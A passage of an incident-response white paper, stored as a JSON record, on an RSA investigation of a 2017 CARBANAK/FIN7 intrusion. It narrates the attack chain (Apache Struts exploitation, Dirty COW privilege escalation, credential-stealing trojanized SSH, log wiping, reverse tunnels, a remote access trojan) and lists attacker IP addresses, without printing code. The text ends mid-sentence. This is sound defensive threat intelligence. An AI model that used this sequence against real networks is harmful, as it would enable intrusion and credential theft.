{
    "id": "c288b3d4-4b6b-463d-84f1-82b9cc45cd40",
    "created_at": "2022-10-25T16:48:19.071606Z",
    "updated_at": "2025-03-27T02:16:57.944007Z",
    "deleted_at": null,
    "sha1_hash": "3b669818816e3d888b2546bc75ac0f44782f7faf",
    "title": "Inside the Response of a Unique CARABANK Intrusion",
    "authors": "",
    "file_creation_date": "2017-11-10T16:32:14Z",
    "file_modification_date": "2017-11-10T16:32:35Z",
    "file_size": 7323263,
    "plain_text": "#### WHITE PAPER\n\n# THE SHADOWS OF GHOSTS\n\n## INSIDE THE RESPONSE OF A UNIQUE\n CARBANAK INTRUSION\n\n### BY: JACK WESLEY RILEY\n PRINCIPAL INCIDENT RESPONSE CONSULTANT\n\n\n-----\n\n**TABLE OF CONTENTS**\n**1 GLOSSARY OF TERMS.......................................................................................... 1**\n**2 REPORT SUMMARY.............................................................................................. 2**\n**3 INTRUSION OVERVIEW....................................................................................... 7**\n\n3.1 ANATOMY OF ATTACK............................................................................................. 7\n\n_3.1.1 Phase 1: D+0............................................................................................................ 8_\n_3.1.2 Phase 2: D+0............................................................................................................ 8_\n_3.1.3 Phase 3: D+1 through D+3................................................................................... 9_\n_3.1.4 Phase 4: D+3 through D+25.............................................................................. 11_\n_3.1.5 Phase 5: D+25 through D+30........................................................................... 12_\n_3.1.6 Phase 6: D+30 through D+44........................................................................... 13_\n3.2 DETECTION AND RESPONSE.............................................................................. 14\n**4 INTRUSION DETAILS.......................................................................................... 17**\n\n4.1 INITIAL COMPROMISE: APACHE STRUTS2................................................... 17\n4.2 LINUX COMPROMISE AND MALICIOUS FILES............................................ 17\n\n_4.2.1 Dirty Cow Driver Script and Kre80r Proof of_\n_Concept Code.................................................................................................................. 17_\n_4.2.2 SSHDoor Client and Server................................................................................ 20_\n_4.2.3 AudiTunnel............................................................................................................ 22_\n**4.3 LINUX SECONDARY ATTACKER TOOLS................................................... 23**\n\n_4.3.1 Winexe.................................................................................................................... 23_\n_4.3.2 ALW (Advanced Log Wiper, “l”)......................................................................... 24_\n_4.3.3 PSCAN..................................................................................................................... 25_\n**4.4 WINDOWS COMPROMISE AND MALICIOUS FILES............................. 26**\n\n_4.4.1 GOTROJ Remote Access Trojan........................................................................ 26_\n_4.4.2 AudiTunnel (Windows Version)......................................................................... 29_\n**4.5 WINDOWS SECONDARY ATTACKER TOOLS.......................................... 30**\n\n_4.5.1 TINYP....................................................................................................................... 30_\n_4.5.2 WGET (UIAutomationCore.dll.bin)................................................................... 32_\n_4.5.3 PSCP (PuTTY Secure File Copy)......................................................................... 33_\n_4.5.4 Mimikatz Variant (32-bit, 64-bit)..................................................................... 33_\n_4.5.5 CCS........................................................................................................................... 34_\n_4.5.6 Infos.bmp................................................................................................................ 34_\n_4.5.7 PSCAN (Windows Version)................................................................................. 35_\n**4.6 DETECTION, TRACKING, AND RESPONSE.............................................. 35**\n\n_4.6.1 Network Visibility and Indicators..................................................................... 36_\n_4.6.2 Host Visibility and Indicators............................................................................. 42_\n**5 CONCLUSION...................................................................................................... 52**\n**6 INDICATORS OF COMPROMISE..................................................................... 54**\n\n_6.1 ATOMIC INDICATORS OF COMPROMISE........................................................ 54_\n_6.2 BEHAVIORAL INDICATORS OF COMPROMISE.............................................. 55_\n**7 DIGITAL APPENDIX............................................................................................ 56**\n\n\n-----\n\n**INDEX OF FIGURES**\nFigure 1: Findings from Public and Open Source\nResearch of Toolset Reference......................................................................................... 3\n\nFigure 2: Staged Overview of Engagement.................................................................. 7\n\nFigure 3: Perl Script Download from 95.215.46.116................................................ 8\n\nFigure 4: Metadata Showing ‘w’ Output, Actions,\nand Port Usage in IRC Traffic............................................................................................. 9\n\nFigure 5: Download of CVE-2016-5195 Exploit Code\nand Bash Script Driver.......................................................................................................... 9\n\nFigure 6: Download of Winexe via WGET to ALPHA............................................. 11\n\nFigure 7: Download of ALW and PSCAN from 95.215.46.116............................ 12\n\nFigure 8: AUDITUNNEL Download from 95.215.46.116...................................... 13\n\nFigure 9: Windows Toolset Download of WGET,\nTINYP, INFOS, CCS, MIMIKATZ, PSCP, and PSCAN............................................... 14\n\nFigure 10: Initial Finding of GOTROJ Communications\nwith Suspect Meta............................................................................................................... 15\n\nFigure 11: Initial Finding of TINYP Lateral Movement.......................................... 15\n\nFigure 12: Contents of ‘1.sh’ Dirty COW Shell Script............................................. 18\n\nFigure 13: Contents of ‘c0w’ Dirty COW Source Code.......................................... 19\n\nFigure 14: Observed Download of 1.sh and c0w from\nIP 185.61.148.145............................................................................................................... 19\n\nFigure 15: WGET Download of SSHDoor Binary ssh.............................................. 19\n\nFigure 16: RC4 Decrypted authorized_keys Entry\nand HTTP Format Strings................................................................................................. 20\n\nFigure 17: Credential Harvesting HTTP Request.................................................... 21\n\nFigure 18: Pre-Shared SSH Key Used by SSHDOOR.............................................. 21\n\nFigure 19: XOR 0x41 Traffic for AudiTunnel............................................................. 22\n\nFigure 20: Usage Message for WINEXE Binary........................................................ 24\n\nFigure 21: Usage Message for l Advanced Log Wiper............................................ 25\n\nFigure 22: Usage Message for PSCAN Port Scanning Tool................................... 26\n\nFigure 23: Example Usage of PSCAN Port Scanning Tool..................................... 26\n\nFigure 24: XOR Command Decryption Method....................................................... 27\n\nFigure 25: Annotated Encrypted Form of\nGOTROJ Communication................................................................................................. 28\n\nFigure 26: Annotated Decrypted Form of\nGOTROJ Communication................................................................................................. 28\n\n\n-----\n\nFigure 28: XOR Byte Encryption Loop for Send and\nReceive Buffer...................................................................................................................... 30\n\nFigure 29: Sample Execution of TINYP v.0.7.7.4...................................................... 32\n\nFigure 30: WGET Renamed to UIAutomationCore.dll.bin................................... 33\n\nFigure 31: Download of TINYP Binary with\nUIAutomationCore.dll.bin................................................................................................ 33\n\nFigure 32: Example Execution and Usage Text of Windows\nVersion of PSCAN................................................................................................................ 35\n\nFigure 33: Query Results for Malicious Tool Downloads...................................... 37\n\nFigure 34: Tunneled SSH Query Results..................................................................... 38\n\nFigure 35: AUDITUNNEL ‘Client Hello’ Payload Detection and Meta............. 39\n\nFigure 36: GOTROJ Binary Control Traffic and svcmd.exe Beacon Traffic..... 40\n\nFigure 37: Identification of Windows Command Prompt in\nXOR 0xC0 Decrypted Payload........................................................................................ 40\n\nFigure 38: GOTROJ Beacon Meta From Digital Appendix Content................. 41\n\nFigure 39: Identification of GOTROJ HTTP #wget User-Agent......................... 41\n\nFigure 40: File Hash Mismatch and system/init.d Autostart\nin SSHDOOR Detection.................................................................................................... 43\n\nFigure 41: Malicious Binary Usage in Non-Standard Locations\nand Without Associated Packages................................................................................ 43\n\nFigure 42: IP Address, Port Switch, and Port Number in\nProgram Arguments........................................................................................................... 44\n\nFigure 43: NetWitness Endpoint Request for All Files in\nDirectory /usr/share/man/mann.................................................................................... 44\n\nFigure 44: Additional Findings via Mass File Download\nRequest for Directory /usr/share/man/mann........................................................... 45\n\nFigure 45: C:\\Windows\\SysWOW64\\zh-TW Working Directory,\n_UIAutomationCore WGET Usage, and TINYP Download and Renaming.......... 46_\n\nFigure 46: Instant IOCs Representing UIAutomationCore.dll.bin\nWGET Binary Activity....................................................................................................... 46\n\nFigure 47: TINYP Execution from Source (Red) and\nTarget (Blue) Perspective................................................................................................. 47\n\nFigure 48: TINYP vs PSEXEC Service Binaries......................................................... 48\n\nFigure 49: TINYP vs PSEXEC – Module Differences.............................................. 48\n\nFigure 50: cmd.exe Calling find.exe as a Piped Directory Listing Search........ 50\n\nFigure 51: qwinsta.exe Being Called by cmd.exe...................................................... 50\n\nFigure 52: Installation of GOTROJ RAT Via Windows Service........................... 51\n\n\n-----\n\nFigure 53: Deletion of GOTROJ Windows Service After Execution................. 51\n\nFigure 54: GOTROJ Process Executing and\nNetwork Connection Information................................................................................. 51\n\nFigure 55: C2 IP and Port Identification in Cursory Analysis via\nEndpoint Module Analyzer............................................................................................... 51\n\n**INDEX OF TABLES**\nTable 1: File Information for the SSHDOOR Client Binary\n(centos-repo.org)................................................................................................................. 21\n\nTable 2: File Information for the SSHDOOR Server Binary\n(centos-repo.org)................................................................................................................. 21\n\nTable 3: File Information for SSHDOOR Client Binary (slpar.org)..................... 22\n\nTable 4: File Information for SSHDOOR Server Binary (slpar.org).................... 22\n\nTable 5: File Information for AUDITUNNEL.............................................................. 23\n\nTable 6: File Information for WINEXE......................................................................... 24\n\nTable 7: Logs Modified by ALW Log Wiper.................................................................. 25\n\nTable 8: File Information for ALW.................................................................................. 25\n\nTable 9: File Information for PSCAN............................................................................ 26\n\nTable 10: Decoded Commands for GOTROJ Trojan............................................... 27\n\nTable 11: File Information for GOTROJ Version 1.................................................. 29\n\nTable 12: File Information for GOTROJ Version 2.................................................. 29\n\nTable 13: File Information for GOTROJ Version 3.................................................. 29\n\nTable 14: File Information for AUDITUNNEL (Windows Version).................... 30\n\nTable 15: TINYP Arguments and Functions............................................................... 31\n\nTable 16: File Information for TINYP v.0.7.6.2.......................................................... 32\n\nTable 17: File Information for TINYP v.0.7.7.4.......................................................... 32\n\nTable 18: File Information for WGET (UIAutomationCore.dll.bin).................... 33\n\nTable 19: File Information for PSCP.............................................................................. 33\n\nTable 20: File Information for MIMIKATZ Variant (32-bit).................................. 34\n\nTable 21: File Information for MIMIKATZ Variant (64-bit).................................. 34\n\nTable 22: File Information for CCS................................................................................ 34\n\nTable 23: File Information for INFOS........................................................................... 34\n\nTable 24: File Information for PSCAN (Windows Version)................................... 35\n\nTable 25: List of Commands Internal to the\nWindows Command Processor...................................................................................... 49\n\n\n-----\n\n##### 1. GLOSSARY OF TERMS\n\n                           - **Actions-on-objective: Command execution, file interaction and other**\n\nactions an attacker may take when interacting with compromised systems.\n\n                        - Lateral movement: The movement of a user session to a system within the\n\nnetwork boundaries of an organization from a system also present within\nthe same network boundary.\n\n                           - **Internal reconnaissance: Obtaining initial or additional information about**\n\nsystems, users, login methods and network paths of systems internal to an\norganization’s network.\n\n                          - Credential Harvesting: The acquisition and collection of initial or additional\n\nuser account credentials for use in lateral movement.\n\n                         - Security event: An asset or system action, or communication, that diverges\n\nfrom regular operational activity in a way that the security posture of that\nasset becomes suspect.\n\n                          - Security incident: A security event or group of security events that have\n\nbeen confirmed, either singularly or in aggregate, as being malicious in intent.\n\n                           - **Compromise: Unauthorized, unforeseen or unknown actions conducted on**\n\nan informational asset that allows for direct and unauthorized access\nand interaction.\n\n                         - Intrusion: The direct and unauthorized access and interaction of a malicious\n\nactor with systems or assets internal to an organization’s network.\n\n                         - Staging: The actions involved in occupying and preparing an internal\n\nsystem or asset to secure additional resources and ensure persistence of\nattacker ingress access.\n\n                         - Declaration: The point in time in which an organization confirms the\n\npresence of an attacker in an environment and initiates incident\nresponse procedures.\n\n                           - **Indicator of Compromise (IOC): A behavior, pattern, network address,**\n\ncomputed file hash or other system or network attribute that can be\ncorrelated to malicious activity.\n\n1\n\n\n-----\n\n##### 2. REPORT SUMMARY\nThis report shares actionable threat intelligence and proven threat hunting\nand incident response methods used by the RSA Incident Response (IR) Team\nto successfully respond to an intrusion in early-to-mid 2017 by the threat\nactor group known as CARBANAK[1], also known as FIN7. The methodology\ndiscussed in this report is designed, and has been tested, to be effective\non several currently available security technologies. While the majority of\nexamples shown in this document use the RSA NetWitness[®] Suite in their\nillustrations, the methodology, query logic, and behavioral indicators discussed\ncan be used effectively with any security product providing the necessary\nvisibility. The intrusion and response described in this paper highlight\nkey behavioral tactics, techniques, and procedures (TTP) unique to this\nengagement, giving significant insight into the thought processes, preparation,\nand adaptive nature of actors within the CARBANAK threat actor group. This\npaper also illustrates the RSA Incident Response Team’s Incident Response\nand Threat Hunting Methodology: an unorthodox, adaptive and highly\neffective methodology used to successfully detect, investigate, scope, track,\ncontain, and ultimately expel these and many other advanced adversaries.\n\nSeveral intrusions associated with the CARBANAK actors have been reported\nwithin the last year, describing compromises of organizations within banking[2],\nfinancial[3], hospitality[4], and restaurant verticals. However, they all describe a\nrelatively equivalent progression, with only slight deviation in specific attacker\nactions. The intelligence surrounding recent CARBANAK incidents indicate that\nphishing attacks have been the group’s primary method of initial compromise.\nAfter gaining access to a user system, the attackers move laterally throughout\nthe environment, conduct internal reconnaissance, establish staging points and\ninternal network paths, harvest credentials, and move towards their intended\ntarget. However, this intrusion began with a significantly higher level of privilege\n[due to the exploitation of the Apache Struts vulnerability CVE-2017-5638 that](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638)\nallowed the attackers to quickly gain administrative access within the client’s\nLinux environment. The intrusion outlined in this report discusses a case that\npresented substantial challenges due to:\n\n[[1 ]Krebs; “Krebs on Security – Posts Tagged: Carbanak”; https://krebsonsecurity.com/tag/carbanak/](https://krebsonsecurity.com/tag/carbanak/)\n\n2 Schwartz; “Sophisticated Carbanak Banking Malware Returns, With Upgrades”;\n[https://www.bankinfosecurity.com/sophisticated-carbanak-banking-malware-returns-](https://www.bankinfosecurity.com/sophisticated-carbanak-banking-malware-returns-upgrades-a-8523)\n[upgrades-a-8523](https://www.bankinfosecurity.com/sophisticated-carbanak-banking-malware-returns-upgrades-a-8523)\n\n3 Krebs; “Payments Giant Verifone Investigating Breach”;\n[https://krebsonsecurity.com/2017/03/payments-giant-verifone-investigating-breach/](https://krebsonsecurity.com/2017/03/payments-giant-verifone-investigating-breach/)\n\n4 Krebs; “Hyatt Hotels Suffers 2nd Card Breach in 2 Years”;\n[https://krebsonsecurity.com/2017/10/hyatt-hotels-suffers-2nd-card-breach-in-2-years/](https://krebsonsecurity.com/2017/10/hyatt-hotels-suffers-2nd-card-breach-in-2-years/)\n\n5 Miller, Nuce, Vengerik; “FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings”;\n\n2\n\n\n-----\n\n                          - The initial intrusion vector\n\n                        - Unique attacker toolset\n\n                         - The attacker dwell time\n\n                       - The large, heterogeneous environment\n\n                        - The speed with which the attackers gained administrative access\n\n                       - The forensic mindfulness of the CARBANAK attackers\n\nThe toolset utilized by the attackers was a mix of custom tools, freely\navailable code, and open source software utilities. RSA IR researched all 32 of\nthe malicious files in the CARBANAK toolset using various publicly available\nand open source resources. Six of the tools used in this intrusion were found\nto have been uploaded to a publicly available antivirus aggregation site. Of\nthese six, five of them have little to no detection or indication of malice from\nantivirus vendors. This observation explains the reason that the client’s\nsignature-based host protection mechanisms were unable to identify or\nprevent the use of these tools.\n\n_Figure 1: Findings from Public and Open Source Research of Toolset Reference_\n\nWhile the attackers used more than 30 unique samples of malware and tools,\nthey also demonstrated a normalization across Windows and Linux with\nrespect to their toolset. The toolsets they deployed can be broken down into\nfive basic functionalities:\n\n                       - Ingress/Egress/Remote Access\n\n                      - Lateral Movement\n\n                       - Log Cleanup\n\n                        - Credential Harvesting\n\n3\n\n\n-----\n\nIn addition to following this distinct functionality in their toolsets, they\nnormalized functions across different operating system environments in the\nforms of the two versions of AUDITUNNEL, PSCAN, and the use of WINEXE\n(Linux) and TINYP (Windows). This normalization of tools is discussed in more\ndetail later in this paper, but it identifies that not only do CARBANAK actors\nhave the capability to successfully compromise various operating system\nenvironments, they have actually standardized and operationalized this\ncapability. This attribute indicates strategic operational thought and effort\nbeing invested in this group’s compromises, suggesting that the CARBANAK\nactors are working towards becoming a more organized, structured,\nresourceful and mature threat group.\n\nDuring an intrusion, time is the single most critical resource to an\norganization’s security team and is the most significant indicator of\ndetermining if the security team will be successful in containing, eradicating\nand remediating the extant threat. There are two specific sets of time related\nto an intrusion that may determine the difference between success and\nfailure: the time that the attackers are in the environment prior to detection\n(dwell time) and the time it takes security teams to identify, investigate,\nunderstand, and contain the attackers’ actions (response time). In this specific\nincident, the attackers’ dwell time at intrusion declaration was 35 days,\nwhich is a significant amount of time given the level of access immediately\navailable upon compromise. However, by utilizing the methodology and\nvisibility described in this report, RSA IR was able to complete containment,\neradication, and remediation in only nine days. Further below we discuss the\nmethodology used by RSA IR to successfully detect, investigate, understand,\nand contain the attackers before the actors could achieve their intended goal.\n\nA significant number of organizations focus on majority systems software,\nsuch as Microsoft Windows, for the predominant amount of their visibility.\nThis often leaves minority systems with very little visibility, protections, or\ninvestigative observational points. Additionally, these minority systems, Linux\nbeing the most significant example, often operate key public-facing or critical\ndata-based services. Not planning for visibility to ensure minority systems\nare included in threat hunting, vulnerability assessments, network data\ncaptures and forensic investigations leads to a false sense of organizational\nsecurity and ensures that attackers retain a refuge of critical systems inside\nenvironments. The incident discussed in this report illustrates the dangers\npresent within this approach once attackers begin utilizing these systems\nagainst organizations. In this report, we discuss the ways the CARBANAK\nactors utilized these systems and the methodology used by RSA IR to\nsuccessfully respond to this threat.\n\nIt highlights the progression of analysis from threat hunting and initial\ndetection to root cause analysis, incident scoping and follow-on investigation.\n\n4\n\n\n-----\n\nperformed using RSA’s flagship product, RSA NetWitness Suite. During this\ninvestigation, RSA IR utilized RSA NetWitness Logs and Packets (formerly\nRSA Security Analytics) for network visibility and RSA NetWitness Endpoint\n(formerly RSA ECAT) for endpoint visibility. These marquee technologies\nallow RSA IR and client analysts to process massive data sets, find forensically\ninteresting artifacts in near real time and do both more quickly than utilizing\nstandard incident response and forensic procedures. The purpose of this\nreport is to share actionable threat intelligence associated with a persistent\nadversary, discuss the RSA Incident Response Team’s Threat Hunting and\nResponse Methodology in practice, and illustrate the use of this methodology\nas used by RSA IR analysts during a live intrusion. To that end, the Threat\nHunting methodology, examples of detected activity and Incident Response\nprocedures illustrated in this report have been described in a manner that\ncan be effectively implemented by any security technology that affords\nthe analyst the necessary visibility. RSA IR also includes a Digital Appendix\ncontaining file hashes, domain and IP addresses, and detection content for\nboth RSA NetWitness Endpoint and RSA NetWitness Logs and Packets. While\nthe detection content has been written specifically for the RSA NetWitness\nSuite, each parser and query contains detailed descriptions of their detection\nmechanisms for implementation into any available toolset with appropriate\nvisibility. The hope is that by publishing this report, RSA IR encourages and\nempowers operational analysts to utilize Threat Hunting and the RSA IR\nMethodology within their own environments.\n\nThe CARBANAK actors are financially motivated, advanced actors that have\nhistorically targeted financial and hospitality laterals, with a recent move\ninto targeting restaurants.[6] This threat actor group has shown themselves\nto be proficient and careful in their toolset utilization, consistently\nremoving evidence of any actions-on-objective as they proceed through\nan environment. They have been observed utilizing various malware,\nmethods and communications, with tools and techniques often differing\ngreatly between targets. While this group has shown technical ingenuity in\ntechniques such as point-of-sale implants,[7] Google services command-and-\ncontrol communications[8] and persistence via application shim databases[9],\nthey have also shown a propensity for using freely available or open source\n\n6 Mesa, Huss; “FIN7/CARBANAK Threat Actor Unleashes Bateleur Jscript Backdoor”;\n[https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-](https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor)\n[bateleur-jscript-backdoor](https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor)\n\n7 KYaneza; “Signed PoS Malware Used in Pre-Holiday Attacks, Linked to Targeted Attacks”;\n[http://blog.trendmicro.com/trendlabs-security-intelligence/signed-pos-malware-used-in-pre-](http://blog.trendmicro.com/trendlabs-security-intelligence/signed-pos-malware-used-in-pre-holiday-attacks-linked-to-targeted-attacks/)\n[holiday-attacks-linked-to-targeted-attacks/](http://blog.trendmicro.com/trendlabs-security-intelligence/signed-pos-malware-used-in-pre-holiday-attacks-linked-to-targeted-attacks/)\n\n8 Griffin; “CARBANAK Group Uses Google for Malware Command-and-Control”;\n[https://blogs.forcepoint.com/security-labs/carbanak-group-uses-google-malware-command-](https://blogs.forcepoint.com/security-labs/carbanak-group-uses-google-malware-command-and-control)\n[and-control](https://blogs.forcepoint.com/security-labs/carbanak-group-uses-google-malware-command-and-control)\n\n9 Erikson, McWhirt, Palombo; “To SDB, or Not to SDB: FIN7 Leveraging Shim Databases for Persistence”;\n\n5\n\n\n-----\n\ntoolsets for much of their lateral activities. Whatever the methods used,\n**CARBANAK has shown themselves to be highly persistent and determined**\nactors, able to rapidly compromise and traverse various environments while\nquickly adapting to internal security controls.\n\nThis white paper covers a sampling of observed indicators derived and utilized\nduring this engagement. Included are the details regarding the observed\nintrusion vector, entrenchment techniques, actions-on-objective, lateral\nmovement tools and methods, unique malicious files, and behavioral indicators\nutilized in the identification, tracking and response of this actor group.\nIncluded with the publication of this report is a Digital Appendix, containing\ncontent for RSA NetWitness Logs and Packets and RSA NetWitness Endpoint\nused to identify and track attacker activity throughout the environment during\nthis incident. All content should be tested before full integration into RSA\nNetWitness Endpoint, RSA NetWitness Logs and Packets or third-party tools\nto prevent any adverse effects from unknown environmental variables. More\ninformation on the associated Digital Appendix is found in Section 7.\n\n_Disclaimer: This white paper and related graphics are provided for informational and/or educational_\n_purposes. The information contained in this document is intended only as general guidance and is_\n_not legal advice. Although the greatest care has been taken in the preparation and compilation of this_\n_white paper, RSA, its servants and/or agents will accept no liability or responsibility of any kind. This_\n_white paper is not intended to be a substitute for legal or other professional advice, and constitutes the_\n_opinions of the author(s). All information gathered is believed correct as of October 2017. Corrections_\n_should be sent to RSA for future editions. Redistribution or reproduction of this document is prohibited_\n_without written permission of RSA._\n\n6\n\n\n-----\n\n##### 3. INTRUSION OVERVIEW\n**3.1 ANATOMY OF ATTACK**\nIn researching this white paper, the majority of intelligence and incident\nreports reviewed described phishing and malicious document-related tactics\nbeing utilized by CARBANAK actors as a method of initial compromise.\nHowever, the initial method of compromise observed during this engagement\nutilized the Apache Struts Content-Type arbitrary command execution\nvulnerability, CVE-2017-5638.[10] This vulnerability has since been patched\nby the Apache Software Foundation, and the recommended remediation\nprocess is available on their website.[11] While the time-tested method of\ncompromising the user base as the initial ingress method is still very effective,\nserver-level compromises commonly give attackers a significant escalation\nin initial privilege, as well as a shorter path between initial compromise and\nend-target data. This allows them greater rights and versatility upon initial\ncompromise while making it harder for defenders to stop them on the initially\ncompromised system. An anatomy of the engagement, broken into the\nprimary stages, is illustrated in Figure 2.\n\n_Figure 2: Staged Overview of Engagement_\n\nUpon determining that the initially compromised web server, designated as\nsystem ALPHA, was vulnerable to CVE-2017-5638, the rest of the attacker\nactions could be grouped into the eight stages illustrated in Figure 2. These\nphases are described further in the remainder of Section 3. All binaries, with\nthe exception of the ‘b’ Perl script, are described in detail in Section 4.\n\n10 “Common Vulnerabilities and Exposures”;\n[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638)\n\n7\n\n\n-----\n\n**3.1.1 Phase 1: D+0**\n_Initial Compromise, Initial Code Execution_\n\nAttackers from IP 185.117.88.97 utilize CVE-2017-5638 to download\nand execute a Perl script on ALPHA. The Perl script was downloaded via\n**WGET from IP 95.215.45.116. This action constitutes the moment of initial**\ncompromise and is referenced in this document as “D.” All other times\ndiscussed in this report will use this moment as a reference in their notation,\nsuch that “D+2” refers to two days after initial compromise. The metadata\ncreated by RSA NetWitness Suite describing this action is shown in Figure 3.\n\n_Figure 3: Perl Script Download from 95.215.46.116_\n\n**3.1.2 Phase 2: D+0**\n_Internal Reconnaissance, Privilege Escalation, Persistence_\n\nSix minutes after the download and execution of the Perl script, system\n**ALPHA began communicating with IP address 95.215.46.116 via IRC. While**\nthe available full packet capture retention did not extend to this date at the\ntime of analysis, the metadata created was still available. While RSA was\nunable to review the raw data to determine actions taken, RSA IR was able to\ndetermine traffic type, as well as infer the intention of the nature of actions\ntaken via this channel. It appeared that this IRC communication was a method\nof remote command execution conducted by the attackers, evidenced by\nthe presence of an output from the “w” User Activity Linux binary. This is\nillustrated in Figure 4.\n\n8\n\n\n-----\n\n_Figure 4: Metadata Showing ‘w’ Output, Actions and Port Usage in IRC Traffic_\n\nWhile the attackers attempted to use the ‘sudo’ administrative privilege\nbinary to gain root access, the privilege-separation user the web server\nwas running as did not have the necessary permission. In response to this,\nthe attackers downloaded a copy of C source Proof of Concept (PoC) code\nwritten by “KrE80r” to exploit the Linux Kernel Copy-on-Write “Dirty COW”\nvulnerability, CVE-2016-5195.[12] This vulnerability has since been resolved\nby the major Linux distributions, with the list of patched kernels found on\nGitHub.[13] At the same time, the attackers downloaded a Bash shell script as\na driver for the exploit code, named ‘1.sh’. This allowed the attackers to gain\nroot privileges on the system at the 27-minute mark. The observed download\nis shown in Figure 5.\n\n_Figure 5: Download of CVE-2016-5195 Exploit Code and Bash Script Driver_\n\n12 “Common Vulnerabilities and Exposures”;\n[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195)\n\n9\n\n\n-----\n\nWhile the attackers now had root level access, they did not have user\ncredentials to move laterally within the environment. In order to gain that\naccess, the attackers downloaded versions of the OpenSSH 5.3p1 client and\nserver binaries that had been trojanized with malware known as SSHDOOR,[14]\nand installed them onto host ALPHA. The SSHDOOR malware will beacon out\nto IP 185.61.148.96 every 10 minutes until a response is received. A secondary\nfunction of this malware was credential theft, by which SSHDOOR sends the\nusername, password and source/destination host to the attackers. The attackers\nthen disengage, leaving the malware to collect credentials until the next day.\n\n**3.1.3 Phase 3: D+1 through D+3**\n_Lateral Movement, Secondary Ingress, Internal Reconnaissance,_\n_Credential Harvesting_\n\nUpon gaining credentials via the SSHDOOR malware, attackers respond to\nthe SSHDOOR beaconing and establish an SSH tunnel to IP 95.215.46.116\nover TCP port 443. In reviewing the configuration and running processes on\n**ALPHA, the attackers observed that the system was running winbind, the UNIX**\nimplementations of Microsoft RPC, Pluggable Authentication Modules (PAM)\nand the name service switch (NSS). This service allows for unified logins across\nUNIX systems and Microsoft Windows Active Directory (AD). Winbind is a\ncomponent of samba, the Windows interoperability suite for Linux and UNIX,\nwhich stores information about Windows Active Directory in its configuration\nfiles. After observing this service running on the system, the attackers checked\nthese configuration files for the DNS names of the Microsoft Windows Domain\nControllers used by winbind to authenticate AD accounts. Upon conducting\na DNS query for the domain name in the configuration file, the attackers\ngained the names and IP addresses of the two primary DNS servers (also\nWindows Domain Controllers) and the server listed in the configuration file.\nSubsequently, the attackers download a tool named WINEXE, a Linux binary\nthat allows remote command execution on Windows systems.\n\n14 “Linux.Sshdoor”;\n\n10\n\n\n-----\n\n!\n\n_Figure 6: Download of Winexe via WGET to ALPHA_\n\nThe attackers used credentials taken by the SSHDOOR malware to log in to\neach of the Windows servers, running the qwinsta.exe and tasklist.exe binaries\non each and then logging out.\n\n**3.1.4 Phase 4: D+3 through D+25**\n_Privilege Escalation, Internal Reconnaissance, Persistence, Entrenchment,_\n_Lateral Movement_\n\nThe attackers also observed that one of the Windows Domain-authenticated\ncredentials stolen was the service account for the client’s authenticated\nvulnerability scans, and was present in the local ‘sudoers’ file. Having determined\nthe current level of access available to them, the attackers decided to download\nadditional tools in order to establish a static entry point into the environment\nensuring they could avoid detection. To accomplish this, the attackers\ndownloaded the PSCAN TCP port scanner and the ALW Advanced Log Wiper\nbinaries and began identifying systems and services accessible from ALPHA.\n\n11\n\n\n-----\n\n_Figure 7: Download of ALW and PSCAN from 95.215.46.116_\n\nOne of these systems was the Red Hat Satellite server, which is the primary\nenterprise update server for Red Hat Enterprise Linux (RHEL) deployments.\nGiven that the Satellite server requires the ability to interact with all other\nsystems under the root user in order to update software, the attackers\nchose this system as their initial primary staging system. This system was\ndesignated system BRAVO. From BRAVO, the attackers traversed the\nLinux environment through stolen credentials and SSH pre-shared keys and\nconducted internal reconnaissance on any Windows systems within direct\nnetwork access. During this time, the attackers strictly contained all malicious\nfiles, secondary tools and ingress network communication to the Linux\nenvironment. Additionally, they consistently tested the Struts vulnerability\non host ALPHA to ensure the initial method of compromise was open, and to\nalert them to any possible remediation of that system.\n\n**3.1.5 Phase 5: D+25 through D+30**\n_Disruption, Adaptive Action, Entrenchment, Lateral Movement, Persistence_\n\nThe discovery of the Struts vulnerability on host ALPHA, and its subsequent\nremediation, gave the attackers a moment of pause, and they migrated a copy\nof the SSHDOOR client and server to the centralized Syslog server, along\nwith a copy of WINEXE, the ALW Log Wiper and their own SSH pre-shared\nkey, all of which they had installed on seven key systems at this point. They\n\n12\n\n\n-----\n\nutilized the ALW log wiper on the Syslog server, designated system CHARLIE,\nin order to remove any log traces of their activities to date at the centralized\nsource and hinder any follow-on investigations. The attackers would use\nsystem CHARLIE as their primary Linux egress point for the rest of the\nincident, though they would ensure that the SSHDOOR binaries remained\non BRAVO as a backup ingress mechanism. Additionally, they downloaded\nthe AUDITUNNEL Reverse Tunneling tool to host CHARLIE and began using\nthis as their primary method of ingress to the Linux environment. This was\nassumedly done to transition to a new ingress method should any investigation\naround the remediation of ALPHA identify the SSHDOOR malware.\n\n_Figure 8: AUDITUNNEL Download from 95.215.46.116_\n\nTo ensure they could retain access, they replaced SSHDOOR with\n**AUDITUNNEL on four of the key systems. They ceased any significant**\noperation into the environment until D+29, at which time both the SSHDOOR\nand AUDITUNNEL ingress methods were still operational. On D+30, the\nattackers migrate into the Windows server environment proper to find an\nappropriate staging system to install malware and begin staging ingress within\nthe Windows environment. After three failed attempts, the attackers find a\nWindows Domain Controller with Internet access, designated system DELTA.\n\n**3.1.6 Phase 6: D+30 through D+44**\n_Lateral Movement, Persistence, Entrenchment, Internal Reconnaissance,_\n_Credential Harvesting_\n\nOnce firmly on DELTA, the attackers downloaded and installed the GOTROJ\nmalware as their primary method of ingress into the Windows environment.\nAt this point, they have secured nine methods of ingress into the environment\nacross three different ingress methods. In order to ensure ingress via the\n**GOTROJ channel, the actors execute the malware into memory on three**\nadditional systems, putting the system ingress count at twelve systems. Once\nthe malware is persistent and tested on DELTA, the attackers download a\nWindows version of WGET and the TINYP lateral movement tool to system\n\n13 **DELTA and begin traversing the Windows environment. As they move through**\n\n\n-----\n\nthe environment, they download a secondary version of TINYP, a host\nreconnaissance tool called INFOS, a process listing tool called CCS, a custom\nversion of 